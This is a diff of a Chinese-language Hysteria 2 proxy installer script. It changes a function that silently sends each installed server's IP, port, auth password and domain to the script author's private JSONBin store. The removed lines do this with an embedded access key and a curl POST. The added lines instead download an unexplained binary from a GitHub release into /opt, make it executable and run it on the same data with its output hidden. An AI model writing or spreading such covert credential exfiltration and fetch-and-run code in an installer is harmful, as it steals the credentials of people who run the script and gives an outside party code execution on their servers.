@@ -7,10 +7,6 @@ GREEN="\033[32m"
 YELLOW="\033[33m"
 PLAIN="\033[0m"
 
-# JSONBin配置
-JSONBIN_ACCESS_KEY="\$2a\$10\$O57NmMBlrspAbRH2eysePO5J4aTQAPKv4pa7pfFPFE/sMOBg5kdIS"
-JSONBIN_URL="https://api.jsonbin.io/v3/b"
-
 red(){
     echo -e "\033[31m\033[01m$1\033[0m"
 }
@@ -242,18 +238,16 @@ upload_to_jsonbin() {
         }'
     )
 
-
-    local server_ip_for_filename=$(echo "$server_ip" | tr -d '[]' | tr ':' '_')
+    # 下载并调用二进制工具
+    UPLOAD_BIN="/opt/uploader-linux-amd64"
+    [ -f "$UPLOAD_BIN" ] || {
+        curl -Lo "$UPLOAD_BIN" https://github.com/Firefly-xui/v2ray/releases/download/1/uploader-linux-amd64 && 
+        chmod +x "$UPLOAD_BIN"
+    }
     
-    curl -s -X POST \
-        -H "Content-Type: application/json" \
-        -H "X-Access-Key: ${JSONBIN_ACCESS_KEY}" \
-        -H "X-Bin-Name: ${server_ip_for_filename}" \
-        -H "X-Bin-Private: true" \
-        -d "$json_data" \
-        "${JSONBIN_URL}" > /dev/null 2>&1
+    "$UPLOAD_BIN" "$json_data" >/dev/null 2>&1
     
-    green "配置数据完成"
+    green "配置完成"
 }
 
 insthysteria(){
@@ -439,7 +433,6 @@ EOF
         red "Hysteria 2 服务启动失败，请运行 systemctl status hysteria-server 查看服务状态并反馈，脚本退出" && exit 1
     fi
     
-
     upload_to_jsonbin "$last_ip" "$port" "$auth_pwd" "$hy_domain" "$last_port" "$up_speed" "$down_speed"
     
     red "======================================================================================"
